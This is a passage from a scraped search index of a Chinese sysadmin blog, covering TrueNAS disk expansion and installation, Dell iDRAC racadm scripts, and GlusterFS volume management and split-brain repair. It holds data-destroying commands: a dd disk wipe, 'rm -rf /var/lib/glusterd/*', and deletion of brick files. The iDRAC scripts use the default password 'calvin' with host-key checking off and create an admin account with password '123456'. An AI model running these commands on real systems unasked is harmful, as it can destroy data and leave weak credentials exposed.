of=/dev/da59 bs=1M count=32 然后插好盘后，必须重启Trunas，才能正常认出盘来，不能热插拔（很奇怪） Storage \u0026ndash;\u0026gt; Pools \u0026ndash;\u0026gt; 点击齿轮 \u0026ndash;\u0026gt; Add Vdevs\n然后选中所有左边的Available Disks，移到右边的Data VDevs 然后看最下面会立刻出红色警告，提示两个vdev的disks不对等\n点击ADD VDEVS，会弹窗警告，选中Confirm，然后点Continue\n会继续弹出一个警告窗，这回就明晰了，旧的数据不会破坏，然后继续选中Confirm，然后点ADD VDEVS\n然后就会开始初始化硬盘\n最后查看zpool，看到有两个RAIDZ3，就加好了\n","permalink":"https://rendoumi.com/posts/20230331-truenas_adddisk/","summary":"\u003cp\u003e之前公司世纪互联和无锡的TureNAS现有硬盘都是38块，满配是60块，所以都需要扩容，扩满再增加22块。\u003c/p\u003e\n\u003cp\u003eTrueNAS的Raid是使用的RaidZ3，基于ZFS的，最多允许3块盘坏\u003c/p\u003e\n\u003cp\u003e首先会建立zpool，然后在zpool里面增加vdev，注意，vdev一旦增加，不可更改。\u003c/p\u003e\n\u003cp\u003e我们这里就犯了第一个错误，所有vdev的磁盘数量最好相等，所以第一次应该先增加30块盘，然后第二次再增加30块，这样两个vdev就是均衡的\u003c/p\u003e\n\u003cp\u003e现在我们这种状况，第一个vdev是38块，第二个vdev是22块，不对等了，会警告\u003c/p\u003e\n\u003cp\u003e具体添加步骤如下：\u003c/p\u003e\n\u003cp\u003e首先浪潮工程师到现场加盘，盘必须做好清除信息，用以下命令通过\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/zero \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/da59 \u003cspan class=\"nv\"\u003ebs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1M \u003cspan class=\"nv\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch1 id=\"然后插好盘后必须重启trunas才能正常认出盘来不能热插拔很奇怪\"\u003e然后插好盘后，必须重启Trunas，才能正常认出盘来，不能热插拔（很奇怪）\u003c/h1\u003e\n\u003cp\u003eStorage \u0026ndash;\u0026gt; Pools \u0026ndash;\u0026gt; 点击齿轮 \u0026ndash;\u0026gt; Add Vdevs\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230331-truenas_adddisk/2022-04-13_093345.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后选中所有左边的Available Disks，移到右边的Data VDevs\n然后看最下面会立刻出红色警告，提示两个vdev的disks不对等\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230331-truenas_adddisk/2022-04-13_093530.png\"\u003e\u003c/p\u003e\n\u003cp\u003e点击ADD VDEVS，会弹窗警告，选中Confirm，然后点Continue\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230331-truenas_adddisk/2022-04-13_093714.png\"\u003e\u003c/p\u003e\n\u003cp\u003e会继续弹出一个警告窗，这回就明晰了，旧的数据不会破坏，然后继续选中Confirm，然后点ADD VDEVS\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230331-truenas_adddisk/2022-04-13_093847.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后就会开始初始化硬盘\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230331-truenas_adddisk/2022-04-13_094112.png\"\u003e\u003c/p\u003e\n\u003cp\u003e最后查看zpool，看到有两个RAIDZ3，就加好了\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20230331190700157\" loading=\"lazy\" src=\"/posts/20230331-truenas_adddisk/image-20230331190700157.png\"\u003e\u003c/p\u003e","title":"TrueNAS系统如何增加新硬盘"},{"content":"收录一下 dell 服务器 idrac 操作常用脚本\n显示Raid卡硬盘\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get controllers\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get vdisks\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get pdisks 清理Foreign磁盘状态\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm storage clearconfig:RAID.Integrated.1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\r删除vdisk\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.5.14 racadm raid deletevd:Disk.Virtual.0:RAID.Integrated.1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\r建立Raid0\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid createvd:RAID.Integrated.1-1 -rl r0 -wp wb -rp ra -name raid_0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Integrated.1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\r建立Raid5\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid createvd:RAID.Integrated.1-1 -rl r5 -wp wb -rp ra -name raid_5 -pdkey:Disk.Bay.1:Enclosure.Internal.0-1:RAID.Integrated.1-1,Disk.Bay.2:Enclosure.Internal.0-1:RAID.Integrated.1-1,Disk.Bay.3:Enclosure.Internal.0-1:RAID.Integrated.1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\r重启服务器\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm serveraction hardreset\r设置硬盘第一启动，禁止F1/F2等待\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set BIOS.biosbootsettings.BootSeq HardDisk.List.1-1,NIC.Integrated.1-1-1\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set BIOS.MiscSettings.ErrPrompt Disabled\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.5.16 racadm jobqueue create BIOS.Setup.1-1 sshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm serveraction hardreset\r设置vnc\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.vncserver.enable Enabled\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.vncserver.Password calvin\r设置idrac其他用户\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminUserName -i 4 newuser\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPassword -i 4 123456\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPrivilege -i 4 0x000001ff\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminEnable -i 4 1\r改掉密码\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPassword -i 4 987654\rNTP的设置\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.ipv4static.dns1 8.8.8.8\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp1 0.asia.pool.ntp.org\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp2 1.asia.pool.ntp.org\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp3 2.asia.pool.ntp.org\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp1 129.250.35.250\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp2 180.211.88.50\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp3 202.112.29.82\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.NTPEnable Enabled\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.NTPMaxDist 16\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.time.timezone Japan\r修改网卡启动为Legacy PXE\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm get nic.nicconfig.1 | grep Legacy\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set nic.nicconfig.1.legacybootproto PXE\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm get nic.nicconfig.1 | grep Legacy\rsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create NIC.Integrated.1-1-1\ripmitool -I lanplus -H $ip -U root -P calvin chassis power reset ","permalink":"https://rendoumi.com/posts/20230331-idrac_dell/","summary":"\u003cp\u003e收录一下 dell 服务器 idrac 操作常用脚本\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003e显示Raid卡硬盘\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get controllers\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get vdisks\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid get pdisks \r\n\r\n清理Foreign磁盘状态\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm  storage clearconfig:RAID.Integrated.1-1\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\r\n\r\n删除vdisk\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.5.14 racadm raid deletevd:Disk.Virtual.0:RAID.Integrated.1-1\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\r\n\r\n建立Raid0\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid createvd:RAID.Integrated.1-1 -rl r0 -wp wb -rp ra -name raid_0 -pdkey:Disk.Bay.0:Enclosure.Internal.0-1:RAID.Integrated.1-1\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\r\n\r\n建立Raid5\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm raid createvd:RAID.Integrated.1-1 -rl r5 -wp wb -rp ra -name raid_5 -pdkey:Disk.Bay.1:Enclosure.Internal.0-1:RAID.Integrated.1-1,Disk.Bay.2:Enclosure.Internal.0-1:RAID.Integrated.1-1,Disk.Bay.3:Enclosure.Internal.0-1:RAID.Integrated.1-1\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create RAID.Integrated.1-1 -s TIME_NOW --realtime\r\n\r\n重启服务器\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm serveraction hardreset\r\n\r\n设置硬盘第一启动，禁止F1/F2等待\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set BIOS.biosbootsettings.BootSeq HardDisk.List.1-1,NIC.Integrated.1-1-1\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set BIOS.MiscSettings.ErrPrompt Disabled\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.5.16 racadm jobqueue create BIOS.Setup.1-1 \r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm serveraction hardreset\r\n\r\n设置vnc\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.vncserver.enable Enabled\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.vncserver.Password calvin\r\n\r\n设置idrac其他用户\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminUserName -i 4 newuser\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPassword -i 4 123456\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPrivilege -i 4 0x000001ff\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminEnable -i 4 1\r\n改掉密码\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm config -g cfgUserAdmin -o cfgUserAdminPassword -i 4 987654\r\n\r\nNTP的设置\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.ipv4static.dns1 8.8.8.8\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp1 0.asia.pool.ntp.org\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp2 1.asia.pool.ntp.org\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp3 2.asia.pool.ntp.org\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp1 129.250.35.250\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp2 180.211.88.50\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.ntp3 202.112.29.82\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.NTPEnable Enabled\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.NTPConfigGroup.NTPMaxDist 16\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set idrac.time.timezone Japan\r\n\r\n修改网卡启动为Legacy PXE\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm get nic.nicconfig.1 | grep Legacy\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm set nic.nicconfig.1.legacybootproto PXE\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm get nic.nicconfig.1 | grep Legacy\r\nsshpass -p \u0026quot;calvin\u0026quot; ssh -oLogLevel=ERROR -oStrictHostKeyChecking=no root@10.224.$1 racadm jobqueue create NIC.Integrated.1-1-1\r\nipmitool -I lanplus -H $ip -U root -P calvin chassis power reset\n\u003c/code\u003e\u003c/pre\u003e","title":"dell服务器idrac常用操作脚本"},{"content":"无锡浪潮TrueNAS系统的安装\n这一版的浪潮定制NAS机器比较特别，没有任何Raid卡，配了Avago的一块pcie sas直通卡：搏通9400卡\n然后是定制机，整体4U的高度，满配是60块16T的大盘，主板在机箱侧面立着，2块小盘做系统。\n由于机房限制，无法直接从本地访问10.18.30.97，导致无法将本地文件挂入idrac的cdrom，只能曲线救国，在172.18.31.2建立一个nfs share，把光盘文件放进去\n到 idrac 的 Remote control ， 再到Virtual media，配好nfs共享 ip: 172.18.31.2 path: /export/nfsshare\n在remote image redirction中可以看到光盘文件，点击Start\n然后重启，CDROM是第一启动媒介\n开始安装，缺省会进入第一项进行安装\n然后会报这个错，panic: AP #1 (PHY# 2) failed!\n见了鬼了，唯一的地方可能是主板部分和博通卡冲突，我们重启进入BIOS，到SATA和sSATA的地方\n把主板的SATA给关掉，禁止AHCI\n同样关掉sSATA，也禁止AHCI\n然后重启安装TrueNAS，这次就可以通过了 安装盘选择前两块SSD小盘，230G openbsd会自动将这两款小盘做成软Raid\n提示会抹掉两块盘的所有数据\n输入root的密码\n选择Boot via BIOS\n建立16G的swap空间\n然后就开始安装，这里没什么动静，也没有进度条，会等很久\n安装完成后会让你重启，然后出来配置界面\n我们首先要配置第二项，Bonding端口 然后再配第一项的静态IP 再配第四项缺省路由 配完就http和https显示正确地址\n输入地址：http://172.18.30.97 登录就完成安装了\n","permalink":"https://rendoumi.com/posts/20230330-truenas_install/","summary":"\u003cp\u003e无锡浪潮TrueNAS系统的安装\u003c/p\u003e\n\u003cp\u003e这一版的浪潮定制NAS机器比较特别，没有任何Raid卡，配了Avago的一块pcie sas直通卡：搏通9400卡\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_135251.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后是定制机，整体4U的高度，满配是60块16T的大盘，主板在机箱侧面立着，2块小盘做系统。\u003c/p\u003e\n\u003cp\u003e由于机房限制，无法直接从本地访问10.18.30.97，导致无法将本地文件挂入idrac的cdrom，只能曲线救国，在172.18.31.2建立一个nfs share，把光盘文件放进去\u003c/p\u003e\n\u003cp\u003e到 idrac 的 Remote control ， 再到Virtual media，配好nfs共享\nip: 172.18.31.2\npath: /export/nfsshare\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_130429.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在remote image redirction中可以看到光盘文件，点击Start\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_130507.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后重启，CDROM是第一启动媒介\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_100332.png\"\u003e\u003c/p\u003e\n\u003cp\u003e开始安装，缺省会进入第一项进行安装\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_100437.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后会报这个错，panic: AP #1 (PHY# 2) failed!\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_095148.png\"\u003e\u003c/p\u003e\n\u003cp\u003e见了鬼了，唯一的地方可能是主板部分和博通卡冲突，我们重启进入BIOS，到SATA和sSATA的地方\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_134550.png\"\u003e\u003c/p\u003e\n\u003cp\u003e把主板的SATA给关掉，禁止AHCI\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_134704.png\"\u003e\n\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_134624.png\"\u003e\u003c/p\u003e\n\u003cp\u003e同样关掉sSATA，也禁止AHCI\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_134744.png\"\u003e\n\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_134808.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后重启安装TrueNAS，这次就可以通过了\n安装盘选择前两块SSD小盘，230G\nopenbsd会自动将这两款小盘做成软Raid\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_115448.png\"\u003e\u003c/p\u003e\n\u003cp\u003e提示会抹掉两块盘的所有数据\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_115557.png\"\u003e\u003c/p\u003e\n\u003cp\u003e输入root的密码\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_115642.png\"\u003e\u003c/p\u003e\n\u003cp\u003e选择Boot via BIOS\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_120946.png\"\u003e\u003c/p\u003e\n\u003cp\u003e建立16G的swap空间\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_121016.png\"\u003e\u003c/p\u003e\n\u003cp\u003e然后就开始安装，这里没什么动静，也没有进度条，会等很久\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_121051.png\"\u003e\u003c/p\u003e\n\u003cp\u003e安装完成后会让你重启，然后出来配置界面\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_131715.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们首先要配置第二项，Bonding端口\n然后再配第一项的静态IP\n再配第四项缺省路由\n配完就http和https显示正确地址\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_132440.png\"\u003e\u003c/p\u003e\n\u003cp\u003e输入地址：http://172.18.30.97\n登录就完成安装了\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/posts/20230330-truenas_install/2021-08-25_140955.png\"\u003e\u003c/p\u003e","title":"TureNAS系统在浪潮定制系统上的安装"},{"content":"特别注意 两台GFS主机172.18.30.18和172.18.30.36上面务必配置/etc/hosts，否则peer的时候会有问题\n172.18.30.18 renhe-18-30-18\r172.18.30.18 renhe-18-30-36\r客户端安装 yum -y install epel-release 然后 yum install glusterfs-fuse 就可以了 挂载： mount.glusterfs 172.18.30.18:/borui-vol /data/br/nfs\nfstab 自动挂载 172.18.30.18:/borui-vol /data/br/nfs glusterfs defaults,_netdev,backupvolfile-server=172.18.30.36 0 0\n在172.18.30.18上建立新卷，因为只有2个节点，就必须force了 gluster volume create test-zhichi-vol replica 2 transport tcp 172.18.30.18:/glusterfs/test-zhichi-vol 172.18.30.36:/glusterfs/test-zhichi-vol force 启动 gluster volume start test-zhichi-vol\n查看一下 gluster volume info test-zhichi-vol\n查看卷信息(禁止查看inode，太多了) gluster volume status test-zhichi-vol detail gluster volume status test-zhichi-vol clients gluster volume status test-zhichi-vol mem gluster volume status test-zhichi-vol fd gluster volume status test-zhichi-vol inode 开启限额 gluster volume quota test-zhichi-vol enable gluster volume quota test-zhichi-vol limit-usage / 50GB gluster volume quota test-zhichi-vol list 限制IP访问 例如允许172.18.31.*网段的主机访问rep-volume：\ngluster volume set test-zhichi-vol auth.allow 172.18.31.*`\n如果客户端想用NFS挂载 gluster volume set test-zhichi-vol nfs.disable off\n开启性能分析（慎用） gluster volume profile test-zhichi-vol start\n开启后性能分析后，显示I/O信息: gluster volume profile gv0 info\nGlusterd 启动失败，原因未知处理办法（慎用，拷出数据后再用）： rm -rf /var/lib/glusterd/* systemctl start glusterd 脑裂解决方法： 脑裂： 使用replica模式的时候，如果发生网络故障（比如交换机坏了、网线被碰掉了），而两台机器都还活着的时候，它们各自的数据读写还会继续。\n当网络恢复时，它们都会认为自己的数据才是正确的，对方的是错误的，这就是俗称的脑裂。\n双方谁都不肯妥协，结果就是文件数据读取错误，系统无法正常运行。 在正常的机器上执行以下操作：\ngluster volume status nfsp （看看这个节点有没有在线） gluster volume heal nfsp full （启动完全修复） gluster volume heal nfsp info （查看需要修复的文件） gluster volume heal nfsp info healed （查看修复成功的文件） gluster volume heal nfsp info heal-failed （查看修复失败的文件） gluster volume heal nfsp info split-brain （查看脑裂的文件） Gathering Heal info on volume nfsp has been successful Brick gls03.mycloud.com.cn:/glusterfs/nfsp Number of entries: 24 at path on brick ----------------------------------- 2014-05-30 10:22:20 /36c741b8-2de2-46e9-9e3c-8c7475e4dd10 。。。。。。。。。。。。。。。。。。。。。。。。。。。。。 。。。。。。。。。。。。。。。。。。。。。。。。。。。。。 。。。。。。。。。。。。。。。。。。。。。。。。。。。。。 在有病的那台机器上，删除脑裂的文件： （注意！要删除的文件是在gluster volume info nfsp看到的目录中，不要去删除挂载的目录中的文件，不然就等着哭吧） 把硬链接文件找出来，也要删除：\nfind /glusterfs/nfsp/ -samefile /glusterfs/nfsp/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 -print /glusterfs/nfsp/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 /glusterfs/nfsp/.glusterfs/65/26/6526e766-cb26-434c-9605-eacb21316447 （这里看得出硬链接文件的目录名和日志中的gfid的对应关系）\n删除掉：\nrm /glusterfs/nfsp/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 rm /glusterfs/nfsp/.glusterfs/65/26/6526e766-cb26-434c-9605-eacb21316447 在正常的机器上执行\ntail -1 /nfsprimary/36c741b8-2de2-46e9-9e3c-8c7475e4dd10 （读一下这个文件，触发修复） ls -l 